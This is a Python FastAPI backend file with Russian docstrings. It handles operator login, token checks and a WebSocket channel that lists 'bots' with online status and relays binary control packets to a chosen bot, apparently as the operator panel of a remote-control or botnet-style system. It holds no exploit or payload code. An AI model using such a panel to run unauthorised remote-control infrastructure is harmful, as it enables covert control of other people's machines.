# backend/API/api.py

import json
import uvicorn
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, WebSocket, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

import backend.LoggerWrapper as logger
from backend.Config import FRONTEND_PATH
from backend.Database import db_get_users, db_get_bots
from .auth_service import verify_user, get_login_by_token, generate_token
from .connection_manager import manager
from backend.Services import (
    pack_packet, 
    has_access, 
    active_clients, 
    preview_cache, 
    send_binary_to_bot
)

app: FastAPI = FastAPI()
app.mount("/sidebar", StaticFiles(directory=FRONTEND_PATH, html=True), name="static")


@app.get("/")
async def root() -> RedirectResponse:
    """
    Перенаправление корневого запроса на страницу авторизации.
    """
    return RedirectResponse("/sidebar/auth/auth.html")


@app.get("/verify_token")
async def verify(token: Optional[str] = None) -> Any:
    """
    Проверка валидности токена сессии.
    """
    if (login := get_login_by_token(token)):
        return {"status": "ok", "login": login}
    
    return JSONResponse(
        status_code=401, 
        content={"status": "err"}
    )


@app.post("/login")
async def auth(data: Dict[str, Any] = Body(...)) -> Any:
    """
    Обработка входа пользователя и генерация токена доступа.
    """
    login_name: str = data.get("login", "")
    password_text: str = data.get("password", "")
    
    if (user := verify_user(login_name, password_text)):
        return {
            "status": "ok",
            "token": generate_token(login_name),
            "role": user["role"],
            "prefix": user["prefix"]
        }
    
    return JSONResponse(
        status_code=401, 
        content={"status": "error", "message": "Invalid credentials"}
    )


@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket, 
    token: str, 
    login: str, 
    mode: Optional[str] = None, 
    target: Optional[str] = None
) -> None:
    """
    Управление WebSocket соединением для обмена данными в реальном времени.
    
    Схема обработки байт:
    [Header: 6] + [BotID_Length] -> [TargetID]
    """
    user_login: Optional[str] = get_login_by_token(token)
    
    if not user_login or user_login != login:
        await websocket.accept()
        await websocket.close(code=1008)
        return

    user_data: Dict[str, Any] = db_get_users().get(user_login)
    
    if not await manager.connect(websocket, user_login, user_data):
        return

    try:
        if mode == "control" and target and has_access(user_data, target):
            if (bot_data := db_get_bots().get(target)):
                bot_status: str = "online" if target in active_clients else "offline"
                bot_data.update({"status": bot_status, "id": target})
                
                packet: bytes = pack_packet(target, "DataScribe", json.dumps(bot_data))
                await websocket.send_bytes(packet)
        else:
            await sync_state(websocket, user_data)

        while True:
            message: Dict[str, Any] = await websocket.receive()
            
            if message.get("type") == "websocket.disconnect":
                break
                
            if "bytes" in message and (packet_bytes := message["bytes"]):
                if len(packet_bytes) >= 7:
                    id_len: int = packet_bytes[0]
                    target_id: str = packet_bytes[6 : 6 + id_len].decode(errors="ignore").strip()
                    
                    if has_access(user_data, target_id):
                        await send_binary_to_bot(target_id, packet_bytes)
                        
    except Exception:
        pass
    finally:
        manager.disconnect(websocket, user_login)


async def sync_state(websocket: WebSocket, user_data: Dict[str, Any]) -> None:
    """
    Синхронизация списка доступных ботов и кэша превью при подключении.
    """
    database: Dict[str, Any] = db_get_bots()
    
    visible_bots: List[Dict[str, Any]] = [
        {
            **bot_val, 
            "status": ("online" if bot_key in active_clients else "offline"), 
            "id": bot_key
        }
        for bot_key, bot_val in database.items()
        if has_access(user_data, bot_key)
    ]

    if visible_bots:
        system_packet: bytes = pack_packet(
            "SYSTEM", 
            "SystemInfo", 
            json.dumps(visible_bots, ensure_ascii=False)
        )
        await websocket.send_bytes(system_packet)

    for bot_id, cached_packet in preview_cache.items():
        if has_access(user_data, bot_id):
            await websocket.send_bytes(cached_packet)


async def run_fastapi_server(host: str, port: int) -> None:
    """
    Запуск веб-сервера Uvicorn для FastAPI приложения.
    """
    uvicorn_config: uvicorn.Config = uvicorn.Config(
        app, 
        host=host, 
        port=port, 
        log_config=None
    )
    uvicorn_server: uvicorn.Server = uvicorn.Server(uvicorn_config)
    await uvicorn_server.serve()